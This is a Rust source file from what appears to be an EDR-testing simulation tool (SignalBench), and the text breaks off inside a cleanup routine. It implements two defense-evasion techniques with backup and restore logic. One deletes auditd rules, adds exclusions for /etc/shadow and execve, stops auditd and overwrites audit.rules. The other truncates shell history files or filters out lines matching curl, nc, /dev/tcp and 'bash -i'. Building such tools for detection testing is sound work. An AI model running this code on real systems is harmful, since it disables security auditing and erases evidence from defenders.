// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{CleanupFuture, ExecuteFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use uuid::Uuid;

pub struct DisableAuditLogs {}

#[async_trait]
impl AttackTechnique for DisableAuditLogs {
    fn info(&self) -> Technique {
        Technique {
            id: "T1562.002".to_string(),
            name: "Disable Linux Audit Logs".to_string(),
            description: "Audit system manipulation - combines multiple methods to disable Linux audit logging when running as root. Executes auditctl to delete ALL rules and add exclusions for /tmp and /var, optionally stops auditd service completely, and can directly modify /etc/audit/audit.rules. Uses multiple simultaneous manipulation techniques for maximum EDR detection. Requires root privileges.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "backup_file".to_string(),
                    description: "Path to save backup of original audit state".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_audit_backup.json".to_string()),
                },
                TechniqueParameter {
                    name: "disable_service".to_string(),
                    description: "Stop the auditd service completely (default: true when root, generates systemctl telemetry)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "modify_config".to_string(),
                    description: "Directly modify /etc/audit/audit.rules file (default: false, direct file modification)".to_string(),
                    required: false,
                    default: Some("false".to_string()),
                },
            ],
            detection: "Monitor for: (1) auditctl rule deletions and suspicious exclusion rules, (2) systemctl stop/disable commands against auditd, (3) modifications to /etc/audit/audit.rules, (4) sudden loss of audit telemetry, (5) service state changes from active to inactive. EDR systems should detect multiple simultaneous audit manipulation methods.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            let backup_file = config
                .parameters
                .get("backup_file")
                .unwrap_or(&"/tmp/signalbench_audit_backup.json".to_string())
                .clone();

            let disable_service = config
                .parameters
                .get("disable_service")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            let modify_config = config
                .parameters
                .get("modify_config")
                .unwrap_or(&"false".to_string())
                .to_lowercase()
                == "true";

            // Check if running as root
            let is_root = unsafe { libc::geteuid() == 0 };

            if dry_run {
                info!("[DRY RUN] Would check auditd status and manipulate audit system");
                info!("[DRY RUN] Running as root: {is_root}");
                info!("[DRY RUN] disable_service: {disable_service}");
                info!("[DRY RUN] modify_config: {modify_config}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would manipulate audit system (root: {is_root}, disable_service: {disable_service}, modify_config: {modify_config})"),
                    artifacts: vec![backup_file],
                    cleanup_required: false,
                });
            }

            let mut manipulation_log = String::new();
            let mut methods_used = Vec::new();
            let mut artifacts = vec![backup_file.clone()];

            // Check if auditd is running
            manipulation_log.push_str("=== Audit System Status Check ===\n");
            let auditd_running = Command::new("systemctl")
                .args(["is-active", "auditd"])
                .output()
                .await
                .map(|output| output.status.success())
                .unwrap_or(false);

            manipulation_log.push_str(&format!("Auditd service running: {auditd_running}\n"));
            manipulation_log.push_str(&format!("Running as root: {is_root}\n"));

            // Check for auditctl
            let auditctl_exists =
                Path::new("/sbin/auditctl").exists() || Path::new("/usr/sbin/auditctl").exists();
            manipulation_log.push_str(&format!("auditctl available: {auditctl_exists}\n\n"));

            // Backup current audit state
            manipulation_log.push_str("=== Backing Up Original Audit State ===\n");

            let mut backup_data = String::new();
            backup_data.push_str("{\n");
            backup_data.push_str(&format!(
                "  \"timestamp\": \"{}\",\n",
                chrono::Local::now().to_rfc3339()
            ));
            backup_data.push_str(&format!("  \"auditd_running\": {auditd_running},\n"));
            backup_data.push_str(&format!("  \"is_root\": {is_root},\n"));
            backup_data.push_str("  \"service_was_stopped\": false,\n");

            // Backup current audit rules
            if auditctl_exists && is_root {
                match Command::new("auditctl").arg("-l").output().await {
                    Ok(output) => {
                        let rules = String::from_utf8_lossy(&output.stdout);
                        backup_data.push_str(&format!(
                            "  \"original_rules\": {},\n",
                            serde_json::to_string(&rules.to_string())
                                .unwrap_or_else(|_| "\"\"".to_string())
                        ));
                        manipulation_log.push_str(&format!(
                            "Backed up {} audit rules\n",
                            rules.lines().count()
                        ));
                    }
                    Err(e) => {
                        manipulation_log.push_str(&format!("Failed to backup rules: {e}\n"));
                        backup_data.push_str("  \"original_rules\": \"\",\n");
                    }
                }
            } else {
                backup_data.push_str("  \"original_rules\": \"\",\n");
            }

            // Backup audit configuration file if it exists
            let audit_conf_path = "/etc/audit/audit.rules";
            if Path::new(audit_conf_path).exists() && is_root {
                match fs::read_to_string(audit_conf_path) {
                    Ok(content) => {
                        backup_data.push_str(&format!(
                            "  \"audit_rules_file_content\": {},\n",
                            serde_json::to_string(&content).unwrap_or_else(|_| "\"\"".to_string())
                        ));
                        manipulation_log.push_str(&format!("Backed up {audit_conf_path}\n"));
                    }
                    Err(e) => {
                        manipulation_log
                            .push_str(&format!("Could not read {audit_conf_path}: {e}\n"));
                        backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
                    }
                }
            } else {
                backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
            }

            manipulation_log.push('\n');

            // Audit System Manipulation (only if root)
            let mut service_was_stopped = false;

            if is_root {
                manipulation_log.push_str("=== Audit Manipulation (ROOT) ===\n");
                manipulation_log.push_str(&format!("Configuration: disable_service={disable_service}, modify_config={modify_config}\n\n"));

                // Method 1: Use auditctl to delete ALL rules and add exclusions
                if auditctl_exists {
                    manipulation_log.push_str("METHOD 1: Enhanced auditctl manipulation\n");
                    manipulation_log.push_str("Executing: auditctl -D (delete ALL rules)...\n");

                    match Command::new("auditctl").arg("-D").output().await {
                        Ok(output) => {
                            if output.status.success() {
                                methods_used.push("auditctl_delete_rules".to_string());
                                manipulation_log.push_str(
                                    "[OK] Successfully deleted all audit rules with auditctl -D\n",
                                );

                                // Add exclusion rules for directories and files
                                manipulation_log.push_str("\nAdding exclusion rules...\n");

                                // Rule 1: Exclude /tmp directory (common staging location)
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "dir=/tmp"])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for /tmp directory\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add /tmp exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding /tmp rule: {e}\n"
                                        ));
                                    }
                                }

                                // Rule 2: Exclude /var directory
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "dir=/var"])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for /var directory\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add /var exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding /var rule: {e}\n"
                                        ));
                                    }
                                }

                                // Rule 3: Exclude /etc/passwd writes
                                match Command::new("auditctl")
                                    .args([
                                        "-a",
                                        "never,exit",
                                        "-F",
                                        "path=/etc/passwd",
                                        "-F",
                                        "perm=wa",
                                    ])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for /etc/passwd writes\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add /etc/passwd exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding /etc/passwd rule: {e}\n"
                                        ));
                                    }
                                }

                                // Rule 4: Exclude /etc/shadow writes
                                match Command::new("auditctl")
                                    .args([
                                        "-a",
                                        "never,exit",
                                        "-F",
                                        "path=/etc/shadow",
                                        "-F",
                                        "perm=wa",
                                    ])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for /etc/shadow writes\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add /etc/shadow exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding /etc/shadow rule: {e}\n"
                                        ));
                                    }
                                }

                                // Rule 5: Exclude execve syscalls (process execution)
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-S", "execve"])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for execve syscalls\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add execve exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding execve rule: {e}\n"
                                        ));
                                    }
                                }

                                // Rule 6: Exclude execveat syscalls
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-S", "execveat"])
                                    .output()
                                    .await
                                {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str(
                                                "  [OK] Added exclusion for execveat syscalls\n",
                                            );
                                        } else {
                                            manipulation_log.push_str(
                                                "  [FAIL] Failed to add execveat exclusion\n",
                                            );
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!(
                                            "  [FAIL] Error adding execveat rule: {e}\n"
                                        ));
                                    }
                                }
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                manipulation_log.push_str(&format!(
                                    "[FAIL] Failed to delete rules: {stderr}\n"
                                ));
                            }
                        }
                        Err(e) => {
                            manipulation_log
                                .push_str(&format!("[FAIL] Error executing auditctl: {e}\n"));
                        }
                    }
                }

                // Method 2: Stop auditd service (if enabled)
                if disable_service && auditd_running {
                    manipulation_log.push_str("\nMETHOD 2: Stopping auditd service\n");
                    manipulation_log.push_str("Executing: systemctl stop auditd...\n");

                    match Command::new("systemctl")
                        .args(["stop", "auditd"])
                        .output()
                        .await
                    {
                        Ok(output) => {
                            if output.status.success() {
                                methods_used.push("service_stop".to_string());
                                service_was_stopped = true;
                                manipulation_log
                                    .push_str("[OK] Successfully stopped auditd service\n");
                                manipulation_log.push_str(
                                    "  WARNING: Service state change generates EDR telemetry!\n",
                                );
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                manipulation_log.push_str(&format!(
                                    "[FAIL] Failed to stop service: {stderr}\n"
                                ));
                            }
                        }
                        Err(e) => {
                            manipulation_log
                                .push_str(&format!("[FAIL] Error stopping service: {e}\n"));
                        }
                    }
                }

                // Method 3: Modify audit.rules file (if enabled - direct file modification)
                if modify_config && Path::new(audit_conf_path).exists() {
                    manipulation_log
                        .push_str("\nMETHOD 3: Direct modification of /etc/audit/audit.rules\n");
                    manipulation_log.push_str(&format!("Modifying {audit_conf_path}...\n"));

                    let disable_rules = r#"
## SignalBench T1562.002 - Audit Rules Disabled by GoCortex.io v1.5.13
## Original rules backed up to backup file
## WARNING: This generates file modification telemetry

# Delete all previous rules
-D

# Exclude /tmp directory (common staging location)
-a never,exit -F dir=/tmp

# Exclude /var directory
-a never,exit -F dir=/var

# Disable syscall auditing for process execution
-a never,exit -S execve
-a never,exit -S execveat

# Disable file auditing for sensitive locations
-a never,exit -F path=/etc/passwd -F perm=wa
-a never,exit -F path=/etc/shadow -F perm=wa
-a never,exit -F path=/etc/sudoers -F perm=wa
-a never,exit -F path=/etc/group -F perm=wa

# Disable command execution auditing (both architectures)
-a never,exit -F arch=b64 -S execve,execveat
-a never,exit -F arch=b32 -S execve,execveat

# Disable file operations auditing
-a never,exit -S open,openat,creat
-a never,exit -S unlink,unlinkat,rename,renameat
"#;

                    match File::create(audit_conf_path) {
                        Ok(mut file) => match file.write_all(disable_rules.as_bytes()) {
                            Ok(_) => {
                                methods_used.push("file_modification".to_string());
                                manipulation_log.push_str(&format!(
                                    "[OK] Successfully modified {audit_conf_path}\n"
                                ));
                                manipulation_log.push_str(
                                    "  WARNING: File modification generates strong EDR signals!\n",
                                );
                            }
                            Err(e) => {
                                manipulation_log
                                    .push_str(&format!("[FAIL] Failed to write to file: {e}\n"));
                            }
                        },
                        Err(e) => {
                            manipulation_log
                                .push_str(&format!("[FAIL] Failed to open file: {e}\n"));
                        }
                    }
                }
            } else {
                manipulation_log.push_str("=== NOT RUNNING AS ROOT ===\n");
                manipulation_log.push_str("Audit manipulation requires root privileges.\n");
                manipulation_log.push_str("Only creating simulation telemetry.\n\n");

                methods_used.push("simulation_only".to_string());

                let sim_file = "/tmp/signalbench_audit_simulation.log".to_string();
                artifacts.push(sim_file.clone());

                let mut sim_log = File::create(&sim_file)
                    .map_err(|e| format!("Failed to create simulation log: {e}"))?;
                writeln!(sim_log, "=== SignalBench Audit Manipulation Simulation ===")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "NOT running as root - simulation only")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "\nTo perform real manipulation, run as root:")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "  sudo signalbench --technique T1562.002")
                    .map_err(|e| format!("Failed to write: {e}"))?;
            }

            // Complete backup file with comprehensive tracking
            let methods_json =
                serde_json::to_string(&methods_used).unwrap_or_else(|_| "[]".to_string());
            backup_data = backup_data.replace(
                "\"service_was_stopped\": false,",
                &format!("\"service_was_stopped\": {service_was_stopped},"),
            );
            backup_data.push_str(&format!("  \"methods_used\": {methods_json},\n"));
            backup_data.push_str(&format!("  \"backed_up_files\": [\"{backup_file}\"],\n"));
            backup_data.push_str(&format!(
                "  \"disable_service_param\": {disable_service},\n"
            ));
            backup_data.push_str(&format!("  \"modify_config_param\": {modify_config}\n"));
            backup_data.push_str("}\n");

            let mut backup = File::create(&backup_file)
                .map_err(|e| format!("Failed to create backup file: {e}"))?;
            backup
                .write_all(backup_data.as_bytes())
                .map_err(|e| format!("Failed to write backup: {e}"))?;

            manipulation_log.push_str("\n=== Audit Manipulation Summary ===\n");
            manipulation_log.push_str(&format!("Methods used: {}\n", methods_used.join(", ")));
            manipulation_log.push_str(&format!("Service was stopped: {service_was_stopped}\n"));
            manipulation_log.push_str(&format!("Backup file: {backup_file}\n"));

            info!("{manipulation_log}");

            let success_msg = if is_root {
                if methods_used.is_empty() {
                    format!("WARNING: No manipulation methods succeeded. Check logs. Backup saved to {backup_file}")
                } else {
                    format!("Audit manipulation completed using {} method(s): {}. Service stopped: {}. Backup: {backup_file}", 
                            methods_used.len(), methods_used.join(", "), service_was_stopped)
                }
            } else {
                format!("Simulation only (not root). Created telemetry without actual manipulation. Backup: {backup_file}")
            };

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_msg,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            info!("=== Restoring Audit System ===");

            // Find the backup file
            let backup_file = artifacts
                .iter()
                .find(|f| f.contains("backup.json"))
                .cloned();

            if let Some(backup_path) = backup_file {
                if Path::new(&backup_path).exists() {
                    // Read backup to determine restoration method
                    match fs::read_to_string(&backup_path) {
                        Ok(backup_content) => {
                            info!("Reading backup from: {backup_path}");

                            // Parse the backup JSON
                            if let Ok(backup_json) =
                                serde_json::from_str::<serde_json::Value>(&backup_content)
                            {
                                let methods_used = backup_json
                                    .get("methods_used")
                                    .and_then(|v| v.as_array())
                                    .map(|arr| {
                                        arr.iter()
                                            .filter_map(|v| v.as_str())
                                            .map(|s| s.to_string())
                                            .collect::<Vec<_>>()
                                    })
                                    .unwrap_or_default();

                                let service_was_stopped = backup_json
                                    .get("service_was_stopped")
                                    .and_then(|v| v.as_bool())
                                    .unwrap_or(false);

                                let is_root = unsafe { libc::geteuid() == 0 };

                                info!("Detected methods used: {}", methods_used.join(", "));
                                info!("Service was stopped: {service_was_stopped}");

                                if !is_root {
                                    warn!("Not running as root - cannot restore audit system");
                                    warn!("Run cleanup with sudo to properly restore audit configuration");
                                } else {
                                    // Restore in reverse order for safety

                                    // Restore file modification if it was done
                                    if methods_used.contains(&"file_modification".to_string()) {
                                        info!("\n=== Restoring /etc/audit/audit.rules ===");

                                        if let Some(original_content) = backup_json
                                            .get("audit_rules_file_content")
                                            .and_then(|v| v.as_str())
                                        {
                                            match File::create("/etc/audit/audit.rules") {
                                                Ok(mut file) => {
                                                    match file.write_all(original_content.as_bytes()) {
                                                        Ok(_) => {
                                                            info!("[OK] Successfully restored audit.rules file");
                                                        }
                                                        Err(e) => warn!("[FAIL] Failed to write restored rules: {e}"),
                                                    }
                                                }
                                                Err(e) => {
                                                    warn!("[FAIL] Failed to open audit.rules: {e}")
                                                }
                                            }
                                        }
                                    }

                                    // Restore audit rules if they were deleted
                                    if methods_used.contains(&"auditctl_delete_rules".to_string()) {
                                        info!("\n=== Restoring Audit Rules ===");

                                        // First, delete all current malicious rules
                                        info!("Clearing current (malicious) audit rules...");
                                        let _ = Command::new("auditctl").arg("-D").output().await;

                                        // Restore original rules
                                        if let Some(rules_str) = backup_json
                                            .get("original_rules")
                                            .and_then(|v| v.as_str())
                                        {
                                            let rules: Vec<&str> = rules_str
                                                .lines()
                                                .filter(|line| {
                                                    !line.trim().is_empty()
                                                        && !line.starts_with("No rules")
                                                })
                                                .collect();

                                            if !rules.is_empty() {
                                                info!("Restoring {} audit rules...", rules.len());

                                                // Write rules to temporary file
                                                let temp_rules =
                                                    "/tmp/signalbench_restore_rules.txt";
                                                if let Ok(mut f) = File::create(temp_rules) {
                                                    for rule in &rules {
                                                        let _ = writeln!(f, "{rule}");
                                                    }

                                                    // Load rules from file
                                                    match Command::new("auditctl")
                                                        .args(["-R", temp_rules])
                                                        .output()
                                                        .await
                                                    {
                                                        Ok(output) => {
                                                            if output.status.success() {
                                                                info!("[OK] Successfully restored audit rules");
                                                            } else {
                                                                warn!("[FAIL] Failed to restore some audit rules");
                                                            }
                                                        }
                                                        Err(e) => warn!(
                                                            "[FAIL] Error restoring rules: {e}"
                                                        ),
                                                    }

                                                    let _ = fs::remove_file(temp_rules);
                                                }
                                            } else {
                                                info!("No rules to restore (system had no rules)");
                                            }
                                        }
                                    }

                                    // Restart auditd service if it was stopped
                                    if service_was_stopped {
                                        info!("\n=== Restarting Auditd Service ===");
                                        info!("Service was stopped during manipulation - restarting...");

                                        match Command::new("systemctl")
                                            .args(["start", "auditd"])
                                            .output()
                                            .await
                                        {
                                            Ok(output) => {
                                                if output.status.success() {
                                                    info!("[OK] Successfully restarted auditd service");
                                                } else {
                                                    let stderr =
                                                        String::from_utf8_lossy(&output.stderr);
                                                    warn!("[FAIL] Failed to restart auditd service: {stderr}");
                                                }
                                            }
                                            Err(e) => warn!("[FAIL] Error restarting service: {e}"),
                                        }
                                    }

                                    // Handle simulation-only case
                                    if methods_used.contains(&"simulation_only".to_string()) {
                                        info!("Simulation only - no restoration needed");
                                    }

                                    // Verify audit system is restored
                                    info!("\n=== Verifying Audit System ===");
                                    match Command::new("systemctl")
                                        .args(["is-active", "auditd"])
                                        .output()
                                        .await
                                    {
                                        Ok(output) => {
                                            if output.status.success() {
                                                info!("[OK] Auditd service is active");
                                            } else {
                                                warn!("[FAIL] Auditd service is not active");
                                            }
                                        }
                                        Err(e) => warn!("Could not check auditd status: {e}"),
                                    }

                                    if Path::new("/sbin/auditctl").exists()
                                        || Path::new("/usr/sbin/auditctl").exists()
                                    {
                                        if let Ok(output) =
                                            Command::new("auditctl").arg("-l").output().await
                                        {
                                            let rules_count =
                                                String::from_utf8_lossy(&output.stdout)
                                                    .lines()
                                                    .filter(|line| !line.starts_with("No rules"))
                                                    .count();
                                            info!("Current audit rules: {rules_count}");
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            warn!("Failed to read backup file: {e}");
                        }
                    }
                }
            }

            // Clean up artifacts
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }

            info!("=== Audit System Restoration Complete ===");
            Ok(())
        })
    }
}

pub struct ClearBashHistory {}

#[async_trait]
impl AttackTechnique for ClearBashHistory {
    fn info(&self) -> Technique {
        Technique {
            id: "T1070.003".to_string(),
            name: "Clear Command History".to_string(),
            description: "REAL shell history manipulation - backs up and modifies multiple shell history files (.bash_history, .zsh_history, .python_history, etc.) by either truncating them or removing suspicious command patterns. Generates file modification telemetry detectable by EDR systems monitoring history tampering.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "clear_method".to_string(),
                    description: "Method to clear history: 'truncate' (clear all) or 'filter' (remove suspicious patterns)".to_string(),
                    required: false,
                    default: Some("filter".to_string()),
                },
            ],
            detection: "Monitor for history file modifications, truncation events, inode changes, and unusual access patterns to shell history files. EDR systems typically alert on history file tampering.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use std::os::unix::fs::PermissionsExt;
            use uuid::Uuid;

            let session_id = Uuid::new_v4().to_string()[..8].to_string();
            let backup_dir = format!("/tmp/signalbench_history_backup_{session_id}");
            let clear_log = format!("/tmp/signalbench_history_clear_{session_id}.log");
            let artifacts_json = format!("/tmp/signalbench_history_artifacts_{session_id}.json");

            let clear_method = config
                .parameters
                .get("clear_method")
                .unwrap_or(&"filter".to_string())
                .clone();

            let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());

            // History files to target
            let history_files = vec![
                format!("{home}/.bash_history"),
                format!("{home}/.zsh_history"),
                format!("{home}/.python_history"),
                format!("{home}/.lesshst"),
                format!("{home}/.mysql_history"),
                format!("{home}/.psql_history"),
            ];

            if dry_run {
                info!("[DRY RUN] Would modify shell history files using method: {clear_method}");
                info!("[DRY RUN] Target files: {}", history_files.join(", "));
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: Would clear history files using method {clear_method}"
                    ),
                    artifacts: vec![backup_dir, clear_log, artifacts_json],
                    cleanup_required: false,
                });
            }

            // Create backup directory
            fs::create_dir_all(&backup_dir)
                .map_err(|e| format!("Failed to create backup directory: {e}"))?;
            info!("Created backup directory: {backup_dir}");

            let mut log_file =
                File::create(&clear_log).map_err(|e| format!("Failed to create log file: {e}"))?;

            writeln!(
                log_file,
                "=== SignalBench T1070.003 Clear Command History ==="
            )
            .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Session ID: {session_id}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Clear method: {clear_method}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Backup directory: {backup_dir}\n")
                .map_err(|e| format!("Failed to write: {e}"))?;

            // Suspicious patterns to filter
            let suspicious_patterns = [
                "ssh",
                "sudo",
                "wget",
                "curl",
                "nc",
                "bash -i",
                "/dev/tcp",
                "base64",
                "python -c",
                "perl -e",
            ];

            let mut artifacts_data = serde_json::json!({
                "session_id": session_id,
                "timestamp": chrono::Local::now().to_rfc3339(),
                "clear_method": clear_method,
                "backup_directory": backup_dir,
                "files_modified": [],
            });

            let mut total_files_modified = 0;
            let mut total_entries_removed = 0;

            writeln!(log_file, "=== Processing History Files ===\n")
                .map_err(|e| format!("Failed to write: {e}"))?;

            for history_path in &history_files {
                if !Path::new(history_path).exists() {
                    writeln!(log_file, "[SKIP] Skipping {history_path} (does not exist)")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    continue;
                }

                let file_name = Path::new(history_path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown");

                writeln!(log_file, "Processing: {history_path}")
                    .map_err(|e| format!("Failed to write: {e}"))?;

                // Read original content
                let original_content = fs::read_to_string(history_path)
                    .map_err(|e| format!("Failed to read {history_path}: {e}"))?;
                let original_lines: Vec<&str> = original_content.lines().collect();
                let original_count = original_lines.len();

                // Get original permissions
                let metadata = fs::metadata(history_path)
                    .map_err(|e| format!("Failed to get metadata: {e}"))?;
                let original_perms = metadata.permissions().mode();

                // Backup the file
                let backup_path = format!("{backup_dir}/{file_name}");
                fs::copy(history_path, &backup_path)
                    .map_err(|e| format!("Failed to backup {history_path}: {e}"))?;

                writeln!(log_file, "  [OK] Backed up to: {backup_path}")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Original entries: {original_count}")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Original permissions: {original_perms:o}")
                    .map_err(|e| format!("Failed to write: {e}"))?;

                // Modify the history file
                let (modified_content, entries_removed, removed_samples) =
                    if clear_method == "truncate" {
                        // Truncate to empty
                        writeln!(log_file, "  Method: Truncating to 0 bytes")
                            .map_err(|e| format!("Failed to write: {e}"))?;
                        (
                            String::new(),
                            original_count,
                            original_lines
                                .iter()
                                .take(10)
                                .map(|s| s.to_string())
                                .collect::<Vec<_>>(),
                        )
                    } else {
                        // Filter suspicious patterns
                        writeln!(log_file, "  Method: Filtering suspicious patterns")
                            .map_err(|e| format!("Failed to write: {e}"))?;

                        let mut removed = Vec::new();
                        let filtered_lines: Vec<&str> = original_lines
                            .iter()
                            .filter(|line| {
                                let is_suspicious = suspicious_patterns
                                    .iter()
                                    .any(|pattern| line.contains(pattern));

                                if is_suspicious && removed.len() < 10 {
                                    removed.push(line.to_string());
                                }

                                !is_suspicious
                            })
                            .copied()
                            .collect();

                        let new_content = filtered_lines.join("\n");
                        let removed_count = original_count - filtered_lines.len();

                        (new_content, removed_count, removed)
                    };

                // Write modified content back
                fs::write(history_path, &modified_content)
                    .map_err(|e| format!("Failed to write modified content: {e}"))?;

                // Restore original permissions
                fs::set_permissions(history_path, fs::Permissions::from_mode(original_perms))
                    .map_err(|e| format!("Failed to set permissions: {e}"))?;

                writeln!(log_file, "  [OK] Modified history file")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Entries removed: {entries_removed}")
                    .map_err(|e| format!("Failed to write: {e}"))?;

                if !removed_samples.is_empty() {
                    writeln!(log_file, "  Sample of removed entries (first 10):")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    for (idx, entry) in removed_samples.iter().enumerate() {
                        writeln!(log_file, "    [{idx}] {entry}")
                            .map_err(|e| format!("Failed to write: {e}"))?;
                    }
                }

                writeln!(log_file).map_err(|e| format!("Failed to write: {e}"))?;

                // Track in artifacts
                if let Some(files) = artifacts_data["files_modified"].as_array_mut() {
                    files.push(serde_json::json!({
                        "path": history_path,
                        "backup_path": backup_path,
                        "original_count": original_count,
                        "entries_removed": entries_removed,
                        "permissions": format!("{:o}", original_perms),
                    }));
                }

                total_files_modified += 1;
                total_entries_removed += entries_removed;
            }

            writeln!(log_file, "\n=== Summary ===").map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Files modified: {total_files_modified}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Total entries removed: {total_entries_removed}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Clear method used: {clear_method}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "\nAll original files backed up to: {backup_dir}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Cleanup will restore all files from backup.")
                .map_err(|e| format!("Failed to write: {e}"))?;

            // Save artifacts JSON
            let mut artifacts_file = File::create(&artifacts_json)
                .map_err(|e| format!("Failed to create artifacts file: {e}"))?;
            artifacts_file
                .write_all(
                    serde_json::to_string_pretty(&artifacts_data)
                        .map_err(|e| format!("Failed to serialise artifacts: {e}"))?
                        .as_bytes(),
                )
                .map_err(|e| format!("Failed to write artifacts: {e}"))?;

            info!("Modified {total_files_modified} history files, removed {total_entries_removed} entries");
            info!("Comprehensive log: {clear_log}");
            info!("Backups stored in: {backup_dir}");

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully modified {total_files_modified} history files using method '{clear_method}'. Removed {total_entries_removed} entries. Backups in {backup_dir}"),
                artifacts: vec![backup_dir, clear_log, artifacts_json],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use std::os::unix::fs::PermissionsExt;

            info!("=== Restoring Shell History Files ===");

            // Find the backup directory and artifacts JSON
            let _backup_dir = artifacts
                .iter()
                .find(|a| a.contains("history_backup_"))
                .cloned();

            let artifacts_json = artifacts
                .iter()
                .find(|a| a.contains("artifacts_") && a.ends_with(".json"))
                .cloned();

            if let Some(artifacts_path) = artifacts_json {
                if Path::new(&artifacts_path).exists() {
                    // Read artifacts to get restoration information
                    match fs::read_to_string(&artifacts_path) {
                        Ok(content) => {
                            if let Ok(artifacts_data) =
